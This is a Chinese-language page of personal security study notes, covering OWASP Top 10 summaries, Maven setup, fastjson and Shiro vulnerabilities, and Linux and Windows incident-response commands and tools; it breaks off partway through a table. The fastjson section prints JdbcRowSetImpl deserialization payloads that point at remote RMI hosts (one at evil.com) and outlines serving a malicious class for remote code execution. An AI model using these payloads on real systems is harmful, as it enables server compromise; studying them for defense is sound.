<h3 id="owasp-top10"><a href="#owasp-top10" class="headerlink" title="owasp top10"></a>owasp top10</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2017</span><br><span class="line">注入</span><br><span class="line">认证崩溃</span><br><span class="line">敏感数据暴露</span><br><span class="line">XML外部实体(XXE)</span><br><span class="line">访问控制崩溃</span><br><span class="line">安全配置不当</span><br><span class="line">跨站脚本</span><br><span class="line">不安全的反序列化</span><br><span class="line">使用含有已知漏洞的组件</span><br><span class="line">日志记录和监控不充分</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">2021</span><br><span class="line">访问控制崩溃</span><br><span class="line">加密失败</span><br><span class="line">注入</span><br><span class="line">不安全的设计</span><br><span class="line">安全配置不当(XML外部实体(XXE))</span><br><span class="line">易受攻击和过时的组件</span><br><span class="line">识别和认证失败(认证崩溃)</span><br><span class="line">软件和数据完整性失败</span><br><span class="line">安全日志记录和监控不充分</span><br><span class="line">服务器请求伪造</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">访问控制崩溃</span><br><span class="line">通过身份验证的用户，可以访问其他用户的相关信息，没有实施恰当的访问权限。攻击者可利用这个漏洞去查看未授权的功能和数据</span><br><span class="line">e.g.用户账户、敏感文件、获取和正常用户相同的权限</span><br><span class="line">水平越权 垂直越权</span><br><span class="line">防范：访问控制 只有在受信服务器端代码或没有服务器的API中有效，这样攻击者才无法控制检查或元数据</span><br><span class="line">	除公有资源外，默认情况下拒绝访问</span><br><span class="line">	严格判断权限，用户只能操作属于自己的内容</span><br><span class="line">	记录失败的访问控制，并在适当时向管理员告警</span><br><span class="line">	对API和控制器的访问进行速率限制，以最大限度降低自动化攻击的危害</span><br><span class="line">	当用户注销后，服务器的JWT令牌失效</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">敏感数据暴露</span><br><span class="line">phpinfo等</span><br><span class="line">	防范：</span><br><span class="line">		加强员工意识 禁传代码到GitHub</span><br><span class="line">		慎用第三方云服务 不要把工作相关带到云端</span><br><span class="line">		禁用工作邮箱注册非工作相关网站</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注入</span><br><span class="line">对用户输入数据合法性没有判断或过滤不严</span><br><span class="line">能与用户交互的地方都可能存在注入</span><br><span class="line">防范：</span><br><span class="line">	关闭sql错误回显</span><br><span class="line">	使用成熟的waf</span><br><span class="line">	前端输入字符白名单验证（长度、类型）</span><br><span class="line">	sql服务运行与专门账号，且使用最小权限</span><br><span class="line">	对输入特殊字符进行转义处理</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">不安全的设计</span><br><span class="line">开发软件时，在关键身份验证、访问控制、业务逻辑和关键部位没有进行安全的设计</span><br><span class="line">业务逻辑体现</span><br><span class="line">	支付逻辑</span><br><span class="line">	密码找回</span><br><span class="line">	验证码暴力破解</span><br><span class="line">	验证码重复使用</span><br><span class="line">	验证码客户端回显</span><br><span class="line">	验证码绕过</span><br><span class="line">	验证码自动识别</span><br><span class="line">支付逻辑漏洞	设计购买、支付等方面的功能除就有可能存在支付漏洞</span><br><span class="line">	修改支付价格</span><br><span class="line">	修改支付状态</span><br><span class="line">	修改购买数量</span><br><span class="line">	修改优惠卷、积分</span><br><span class="line">	修改支付接口</span><br><span class="line">	多重替换支付</span><br><span class="line">	重复支付</span><br><span class="line">	最小额支付</span><br><span class="line">	最大额支付问题</span><br><span class="line">	无限制试用</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">安全配置不当</span><br><span class="line">不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP标头配置以及包含敏感信息的向西错误信息</span><br><span class="line">不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且需要及时修补和升级他们</span><br><span class="line">可能存在的风险点</span><br><span class="line">	应用程序启用或者安装了不必要的安全功能</span><br><span class="line">	默认账户名和密码没有修改</span><br><span class="line">	应用软件已国企或出了新版本未更新</span><br><span class="line">	应用程序服务器，应用程序框架等未进行安全配置</span><br><span class="line">	错误处理机制披露大量敏感信息</span><br><span class="line">	对于更新的系统，禁用或不安全地配置安全功能</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用含有已知漏洞组件</span><br><span class="line">组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">识别和认证失败</span><br><span class="line">通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其他开发缺陷来暂时性或永久性冒充其他用户的身份。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">软件和数据完整性失败</span><br><span class="line">软件和数据完整性故障与不能防止完整性违规的代码和基础设施有关。		下软件hash值匹配  </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不足的日志记录和监控</span><br><span class="line">不足的日志记录和监控，以及事件响应确实或无效的集成，是攻击者能够近一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。</span><br><span class="line">	未记录可审计性事件 登录、登陆失败、高额交易</span><br><span class="line">	告警和错误事件未能产生不足和不清晰的日志信息</span><br><span class="line">	日志信息仅在本地存储</span><br><span class="line">	没有利用应用系统和api的日志信息来监控可疑活动</span><br><span class="line">	对于实时或准实时的攻击，应用程序无法检测、处理和告警</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器端请求伪造</span><br><span class="line">攻击者能够从易受攻击的Web应用陈虚谷发送精心设计的请求对其他网站进行攻击</span><br><span class="line">A让B帮忙访问C</span><br></pre></td></tr></table></figure>

<h3 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">idea2020 maven3.6</span><br><span class="line">maven下载加个环境变量</span><br><span class="line"></span><br><span class="line">修改/conf/settings.xml</span><br><span class="line">	仓库位置	斜杠方向改下</span><br><span class="line">      &lt;localRepository&gt;D:/maven_jar/repository&lt;/localRepository&gt;</span><br><span class="line">    镜像 &lt;mirrors&gt;标签中添加</span><br><span class="line">    &lt;mirror&gt;</span><br><span class="line">      &lt;id&gt;nexus-aliyun&lt;/id&gt;</span><br><span class="line">      &lt;mirrorOf&gt;central&lt;/mirrorOf&gt;</span><br><span class="line">      &lt;name&gt;Nexus aliyun&lt;/name&gt;</span><br><span class="line">      &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public&lt;/url&gt;</span><br><span class="line">    &lt;/mirror&gt;</span><br><span class="line">	项目根目录下 mvn compile 此时就会下载项目的jar文件</span><br><span class="line">	执行main方法</span><br><span class="line">		mvn exec:java -Dexec.mainClass=&quot;com.xxxx.demo.Hello&quot;</span><br><span class="line">		</span><br><span class="line">java项目选择org.apache.maven.archetypes:maven-archetype-quickstart</span><br><span class="line">web项目选择org.apache.maven.archetypes:maven-archetype-webapp</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230417232216350.png" alt="image-20230417232216350"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">项目setting配置</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\1688006810775.png" alt="1688006810775"></p>
<h3 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1Ab4y1d7w1</span><br><span class="line">fastjson  json和java的object对象</span><br><span class="line">实现一个java对象</span><br><span class="line">	属性</span><br><span class="line">	setter getter</span><br><span class="line">&#123;</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://192.168.213.153:9999/dnslog&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">autotype机制 记录原始类型</span><br><span class="line">这里就可以做恶意攻击 引入com.sun.rowset.JdbcRowSetImpl这是个实现继承 implement的类有个属性dataSourceName可以调用rmi服务器</span><br><span class="line">	rmi服务器 一个机器 执行 另一个机器  给的命令   不回显</span><br><span class="line">	搭建一个rmi服务器 github开源项目 这地方踩坑 开源项目里maven的plugin jdk版本   		要么升级jdk版本要么去改setting依赖</span><br><span class="line">	搭建攻击服务器 用runtime和process那两个类去编写java恶意文件再编译成class文件 用SimpleHTTPServer去开个http服务</span><br><span class="line"></span><br><span class="line">抓包修改进行攻击</span><br><span class="line"></span><br><span class="line">1.2.24版本</span><br><span class="line">1.2.25版本 checkautotype机制	黑白名单检测</span><br><span class="line">	特殊处理 Lxxxx; ---&gt; Lxxx;</span><br><span class="line">	</span><br><span class="line">1.2.47 autotype不开启 全局缓存 fastjson cache设置为true--&gt;val对应的class到全局缓存中</span><br><span class="line">&#123;</span><br><span class="line">    &quot;a&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;java.lang.Class&quot;,</span><br><span class="line">        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;b&quot;:&#123;</span><br><span class="line">        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,</span><br><span class="line">        &quot;dataSourceName&quot;:&quot;rmi://evil.com:9999/Exploit&quot;,</span><br><span class="line">        &quot;autoCommit&quot;:true</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="shiro"><a href="#shiro" class="headerlink" title="shiro"></a>shiro</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shiro框架 shiro 1.2.24</span><br><span class="line">remember me 功能		cookie 很大</span><br><span class="line">aes加密 密钥泄露在函数里面</span><br></pre></td></tr></table></figure>

<h3 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">事件分类</span><br><span class="line">    应用层 数据篡改 挂马 webshell</span><br><span class="line">    主机层 挖矿 对外ddos 勒索病毒</span><br><span class="line">    网络层 ddos cc 劫持</span><br><span class="line">    数据层 数据库信息泄露 内部人员</span><br><span class="line">    </span><br><span class="line">应急响应之殇</span><br><span class="line"> 	安全事件现场被破坏 缺少日志集中管理或没有开启日志 缺少日常安全巡检 弱口令之殇 历史安全事件后遗症 安全设备当摆设 缺少安全运营人员 资产管理混乱 缺少对安全事件的跟踪与响应能力</span><br><span class="line"> 	管理制度问题 多人持有重要资产的权限</span><br><span class="line"> 	 安全设备发现问题的能力有限</span><br><span class="line"></span><br><span class="line">目标		拔网线</span><br><span class="line">	阻断黑客攻击对整个安全事件发生的过程进行还原 找到问题发生的根源 并采取对应补救措施 避免类似事件发生</span><br><span class="line">	1.判断应急是否是被成功入侵的安全事件</span><br><span class="line">	2.阻断黑客攻击</span><br><span class="line">	3.找出攻击者的第一入口点 提取恶意样本</span><br><span class="line">	4.帮助客户梳理攻击者的攻击路线 提供漏洞修复方案</span><br><span class="line"></span><br><span class="line">应急响应流程</span><br><span class="line">	1.事件判断 判断是否为安全事件 何种安全事件 勒索 挖矿 断网 ddos等</span><br><span class="line">	2.临时处置 给出客户处置建议 断网隔离 保护现场环境</span><br><span class="line">	3.信息收集分析 收集客户信息合中毒主机信息 包括样本 日志分析 进程分析 启动项分析 样本分析</span><br><span class="line">	4.清理处置 直接杀掉进程 删除文件 打补丁 抑或是修复文件</span><br><span class="line">	5.产出报告 整理并输出完整的安全事件报告</span><br><span class="line">	</span><br><span class="line">应急前沟通</span><br><span class="line">	1.现象是什么 如何发现的</span><br><span class="line">	2.什么时候</span><br><span class="line">	3.是否有物理隔开(断网)</span><br><span class="line">	4.受害机器哪个 几台 最先是哪台</span><br><span class="line">	5.对外有哪些服务</span><br><span class="line">	6.是否处于用一个内网</span><br><span class="line">	7.操作系统类型 是否有公网映射业务 远程管理方式 网络边界有没有流量监控设备 主机侧是否有EDR等安全设备</span><br><span class="line"></span><br><span class="line">要点</span><br><span class="line">	1.了解常见端口的攻击手法</span><br><span class="line">	2.不要相信客户说的话 </span><br><span class="line">	</span><br><span class="line">常见攻击漏洞</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425105425151.png" alt="image-20230425105425151"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常见组件漏洞</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425105542529.png" alt="image-20230425105542529"></p>
<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425105933648.png" alt="image-20230425105933648"></p>
<h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">关键目录</span><br><span class="line">    /etc/passwd				用户信息文件</span><br><span class="line">    /etc/rc.d/rc.local		开机启动项</span><br><span class="line">    /root/.ssh				root用户ssh公钥和私钥			私钥可能不在</span><br><span class="line">    /tmp					系统或用户临时文件的目录</span><br><span class="line">    /etc/hosts				本地IP地址域名解析文件		解析到本地 杀毒软件不能更新</span><br><span class="line">    /etc/init.d/			开机启动项					1-6不同文件</span><br><span class="line">常用命令</span><br><span class="line">	ls -alt		全部 列表 排序</span><br><span class="line">	free -h		查看内存使用情况</span><br><span class="line">	ps auxf或top	查看系统进程及子进程</span><br><span class="line">	netstat	-antpl	查看网络连接	需要root权限才能看pid</span><br><span class="line">		根据pid	ls -alh /proc/pid的值</span><br><span class="line">	lsof -i:port	查看端口打开的文件</span><br><span class="line">	lsof -p pid		查看进程打开的文件</span><br><span class="line">	lsof -u root	查询用户打开的文件</span><br><span class="line">	chattr	修改文件属性</span><br><span class="line">	lsattr	显示文件属性</span><br><span class="line">	启动项排查</span><br><span class="line">		cat /etc/rc.local</span><br><span class="line">		ls -alt /etc/profile.d/*.sh</span><br><span class="line">	grep</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425140105688.png" alt="image-20230425140105688"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">	history cat ~/.bash_history		查看历史命令</span><br><span class="line">	rpm -Va、dpkg -verify		校验RPM包</span><br><span class="line">		S	对应文件大小不一致</span><br><span class="line">		M	文件权限和所有权不一致</span><br><span class="line">		5	对应MD5不一致</span><br><span class="line">		D	设备号和驱动不一致</span><br><span class="line">		L	文件符号连接内容不一致</span><br><span class="line">		U	文件所有者不一致</span><br><span class="line">		G	文件群组不一致</span><br><span class="line">		T	文件修改时间不一致</span><br><span class="line">		SM5!!</span><br><span class="line">	stat	查看文件(文件夹)详细信息</span><br><span class="line">	find / -mtime 0 -name *.jsp	查找/目录下指定天数修改的指定类型文件</span><br><span class="line">	find / -ctime 0 -name *.jsp	查找/目录下指定天数新增的指定类型文件</span><br><span class="line">	diff -c 1.txt 2.txt  	比较文件差异</span><br><span class="line">	查找隐藏进程</span><br><span class="line">		ps -ef | awk &#x27;&#123;print $2&#125;&#x27; | sort -n | uniq &gt; ps.p</span><br><span class="line">		ls /proc | sort -n | uniq &gt; proc.p</span><br><span class="line">		diff ps.p proc.p</span><br><span class="line">	last	用户登录历史</span><br><span class="line">	lastb	用户登录失败			ssh爆破</span><br><span class="line">	lastlog	用户最近一次登录信息</span><br><span class="line"></span><br><span class="line">日志分析</span><br><span class="line">	内核和系统日志</span><br><span class="line">		syslog管理 配置文件 /etc/syslog.conf</span><br><span class="line">	用户日志</span><br><span class="line">		记录系统用户登录登出信息 包括用户名账号 登陆时间 源ip</span><br><span class="line">	应用日志</span><br><span class="line">		程序运行过程中各个事件</span><br><span class="line"></span><br><span class="line">用户日志</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425142341515.png" alt="image-20230425142341515"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo grep &quot;sshd.*Accept.*from &lt;ip_address&gt;&quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;		查找登陆成功</span><br><span class="line">grep &quot;useradd&quot; /var/secure</span><br><span class="line">grep &quot;userdel&quot; /var/secure</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">应急工具</span><br><span class="line">Busybox	集成300多个linux命令的工具集</span><br><span class="line">	./busybox netstat -antpl</span><br><span class="line">unhide	yum安装</span><br><span class="line">	检测发现那些借助rootkit及其他技术隐藏TCP/UDP端口的命令行工具</span><br><span class="line">chkrootkit</span><br><span class="line">	linux下检RootKit的脚本</span><br><span class="line">Rkhunter</span><br><span class="line">ClamAV</span><br><span class="line">	检测木马 病毒 恶意软件和其他恶意威胁的开源防病毒引擎</span><br><span class="line">河马webshell查杀工具</span><br><span class="line">	https://www.shellpub.com/</span><br><span class="line">内存马查杀</span><br><span class="line">	https://github.com/c0ny1/java-memshell-scanner</span><br></pre></td></tr></table></figure>

<h4 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">常用命令</span><br><span class="line">regedit			注册表</span><br><span class="line">Taskmgr			任务管理器</span><br><span class="line">Msconfig		系统配置(包含启动项)</span><br><span class="line">eventvwr.msc	事件查看器</span><br><span class="line">compmgmt.msc	计算机管理(本地用户和组)</span><br><span class="line">gpedit.msc		本地组策略</span><br><span class="line">taskschd.msc	计划任务</span><br><span class="line">lusrmgr.msc		本地用户和组</span><br><span class="line"></span><br><span class="line">net user	本机用户列表</span><br><span class="line">net localgroup administrators	本机管理员</span><br><span class="line">net session 	当前会话</span><br><span class="line">net start		查看当前运行的服务</span><br><span class="line">net use		远程连接</span><br><span class="line">net share	当前用户下的共享目录</span><br><span class="line">%UserProfile%\Recent、%APPDATA%\Microsoft\Windows\Recent		最近打开的文件</span><br><span class="line">findstr /m /i /s &quot;hello&quot; *.txt		查找文件中字符串</span><br><span class="line"></span><br><span class="line">netstat -anp		查看网络连接</span><br><span class="line">systeminfo			操作系统项目配置信息		修补程序</span><br><span class="line"></span><br><span class="line">Wmic process		获取系统进程信息</span><br><span class="line">wmic process where name=&quot;cmd.exe&quot; get process,executablepath,name		根据应用程序查找PID</span><br><span class="line">wmic process where processid=&quot;4296&quot; get executablepath,name			根据PID查找应用程序</span><br><span class="line"></span><br><span class="line">tasklist	获取系统进程信息</span><br><span class="line">	tasklist /m dll名称	查询特定dll调用情况</span><br><span class="line"></span><br><span class="line">certutil -hashfile %样本exe% MD5	计算样本MD5</span><br><span class="line"></span><br><span class="line">敏感目录</span><br><span class="line">%WINDIR%</span><br><span class="line">%WINDIR%\system32</span><br><span class="line">%TEMP%&quot;</span><br><span class="line">%LOCALAPPDATA%</span><br><span class="line">%APPDATA%</span><br><span class="line"></span><br><span class="line">日志分析	eventvwr</span><br><span class="line">	系统日志 %SystemRoot%System32WinevtLogsSystem.evtx</span><br><span class="line">		ID 12 	系统启动</span><br><span class="line">		ID 6005	事件日志服务已启动</span><br><span class="line">		ID 6006	事件日志服务已停止</span><br><span class="line">		ID 13	系统关闭</span><br><span class="line">	安全日志 %SystemRoot%System32WinevtLogsSecurity.evtx</span><br><span class="line">		用户登录登出 系统资源使用 系统策略改变事件 须具备管理员权限</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\安全笔记.assets\image-20230425150957148.png" alt="image-20230425150957148"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">		事件id每个win系统不一致</span><br><span class="line">	应用程序日志 %SystemRoot%System32WinevtLogsApplication.evtx</span><br><span class="line">应急工具</span><br><span class="line">	PCHunter 内核监控软件	查看内核文件、驱动模块、隐藏进程、注册表</span><br><span class="line">	Autoruns 登录加载程序、驱动程序加载、服务启动、计划任务等Windows中各种方面的启动项</span><br><span class="line">	Process monitor 监控程序的操作</span><br><span class="line">	Microsoft Network Monitor	网络流量监控软件</span><br><span class="line">	Everything</span><br><span class="line">	sysmon	系统监控工具</span><br><span class="line">威胁情报平台&amp;样本分析</span><br><span class="line">	奇安信威胁情报中心</span><br><span class="line">	微步在线社区</span><br><span class="line">	Virus total</span><br><span class="line">	IBM XFORCE</span><br><span class="line">BeaconEye	扫描Cobalt Strike内存特征 并进行Beacon Config扫描解析对应的Beacon信息</span><br><span class="line">	https://github.com/CCob/BeaconEye</span><br></pre></td></tr></table></figure>

<h3 id="天眼"><a href="#天眼" class="headerlink" title="天眼"></a>天眼</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 